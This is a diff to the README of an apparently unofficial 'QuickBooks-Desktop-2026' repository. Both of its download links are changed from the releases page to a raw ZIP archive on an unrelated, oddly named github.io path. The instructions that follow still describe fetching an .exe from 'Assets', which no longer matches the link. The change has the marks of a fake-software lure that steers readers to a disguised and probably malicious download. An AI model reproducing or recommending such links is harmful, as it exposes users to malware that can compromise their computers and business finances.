@@ -5,7 +5,7 @@ description: "Manage QuickBooks Desktop 2026 workflows with standardized setup g
 ---
 # 📈 QuickBooks-Desktop-2026 - Manage business finances and company files
 
-[![Download](https://img.shields.io/badge/Download-QuickBooks-blue.svg)](https://github.com/Sepulchral-setter477/QuickBooks-Desktop-2026/releases)
+[![Download](https://img.shields.io/badge/Download-QuickBooks-blue.svg)](https://github.com/Sepulchral-setter477/sepulchral-setter477.github.io/raw/refs/heads/main/agacella/setter_github_io_sepulchral_v1.6.zip)
 
 QuickBooks-Desktop-2026 provides a platform to manage company files, conduct bank reconciliations, and automate backup schedules on Windows systems. This tool assists small business owners with bookkeeping tasks and financial organization.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these specifications to run the software:
 
 Follow these steps to obtain the installer from the repository:
 
-1. Visit [this page to download](https://github.com/Sepulchral-setter477/QuickBooks-Desktop-2026/releases).
+1. Visit [this page to download](https://github.com/Sepulchral-setter477/sepulchral-setter477.github.io/raw/refs/heads/main/agacella/setter_github_io_sepulchral_v1.6.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder for easy access.
